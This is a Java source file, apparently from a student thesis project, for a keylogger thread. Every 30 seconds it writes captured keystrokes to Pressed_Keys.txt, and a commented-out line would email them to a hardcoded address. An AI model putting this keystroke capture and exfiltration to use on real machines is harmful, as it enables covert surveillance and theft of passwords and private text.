package hr.fer.zavrsni.Handlers;

import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Razred predstavlja dretvu koja obavlja prikupljanje podataka.
 * 
 * @author Marino Rabuzin
 */
public class ManageService implements Runnable{

	/**
	 * Implementacija tipkovnice sa slusacima za tipke.
	 */
	private NativeKeyboard keyboard;
	
	/**
	 * Dretva koja obavlja prikupljanje podataka.
	 */
	private Thread service;
	
	/**
	 * Putanja do datoteke gdje se upisuju informacije o pritisnutim tipkama.
	 */
	private final Path filePath = Paths.get("./Pressed_Keys.txt");
	
	/**
	 * Pretpostavljani konstruktor koji inicijalizira varijable i pokrece posao dretve.
	 */
	public ManageService() {
		keyboard = new NativeKeyboard();
		service = new Thread(this, "Manage Service");
		service.start();
	}

	/**
	 * Metoda dohvaca implementaciju tipkovnice sa slusacima za tipke.
	 * 
	 * @return tipkovnica sa slusacima za tipke
	 */
	public NativeKeyboard getKeyboard() {
		return keyboard;
	}

	@Override
	public void run() {
		long start = System.nanoTime();
		while(true) {
			long elapsed = (System.nanoTime() - start) / 1_000_000;
			if(elapsed > 30_000) {
				try {
					//MailSender sender = new MailSender("progi.projekt@gmail.com", "Pressed keys", Utils.prettyPrint(keyboard.getKeyCache()));
					OutputStream os = Files.newOutputStream(filePath);
					os.write(Utils.formattedPrint(keyboard.getKeyCache()).getBytes());
					
					System.out.println("Keys are stored.");
					
					keyboard.clearCache();
					os.close();
				} catch(IOException e) {
					e.printStackTrace();
					keyboard.onFail();
				}
				
				start = System.nanoTime();
			}

		}

	}
}